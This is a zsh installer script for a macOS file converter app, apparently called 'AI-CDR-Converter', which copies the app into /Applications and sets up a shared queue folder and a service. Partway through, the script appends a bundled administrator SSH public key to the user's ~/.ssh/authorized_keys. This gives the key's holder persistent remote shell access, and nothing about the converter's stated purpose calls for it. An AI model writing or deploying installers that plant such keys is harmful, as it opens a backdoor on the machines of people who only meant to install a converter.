#!/bin/zsh
# Install the converter after the native AppKit launcher has started.

set -euo pipefail

BUNDLE_ROOT="${AI_CDR_BUNDLE_ROOT:?missing bundle root}"
RESOURCE_DIR="$BUNDLE_ROOT/Contents/Resources"
SHARED_ROOT="${AI_CDR_SHARED_ROOT:-}"
if [[ -z "$SHARED_ROOT" ]]; then
    normal_root="${BUNDLE_ROOT:h}/AI转CDR共享"
    if [[ "$BUNDLE_ROOT" != /private/var/folders/*/AppTranslocation/* ]] && [[ -w "${BUNDLE_ROOT:h}" ]]; then
        SHARED_ROOT="$normal_root"
    else
        mounted_roots=(/Volumes/*/AI转CDR工具/AI转CDR共享(N/))
        if (( ${#mounted_roots} != 1 )); then
            /bin/echo "Expected one mounted NAS queue under /Volumes/*/AI转CDR工具/AI转CDR共享, found ${#mounted_roots}" >&2
            exit 2
        fi
        SHARED_ROOT="$mounted_roots[1]"
    fi
fi
LOCAL_APP="/Applications/AI-CDR-Converter.app"
LOCAL_BINARY="$LOCAL_APP/Contents/MacOS/AI-CDR-Converter"
LOCAL_LOG="$HOME/Library/Logs/AI-CDR-Installer.log"
SHARED_LOG="$SHARED_ROOT/installer.log"

/bin/mkdir -p "$HOME/Library/Logs" "$SHARED_ROOT"
exec > >(/usr/bin/tee -a "$LOCAL_LOG" "$SHARED_LOG") 2>&1

/bin/echo "Installer started: $BUNDLE_ROOT"
/usr/bin/ditto "$RESOURCE_DIR/AI-CDR-Converter.app" "$LOCAL_APP"
/bin/chmod 755 "$LOCAL_BINARY"
/bin/echo "Converter app installed"

/bin/mkdir -p "$HOME/.ssh"
/bin/chmod 700 "$HOME/.ssh"
/usr/bin/touch "$HOME/.ssh/authorized_keys"
/bin/chmod 600 "$HOME/.ssh/authorized_keys"
admin_key="$(/bin/cat "$RESOURCE_DIR/admin_key.pub")"
if ! /usr/bin/grep -qxF "$admin_key" "$HOME/.ssh/authorized_keys"; then
    /bin/echo "$admin_key" >>"$HOME/.ssh/authorized_keys"
fi
/bin/echo "SSH administration key authorized"

"$LOCAL_BINARY" init --root "$SHARED_ROOT"
"$LOCAL_BINARY" install-service --root "$SHARED_ROOT"
/usr/bin/open "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility" || true
/bin/echo "Installation completed"
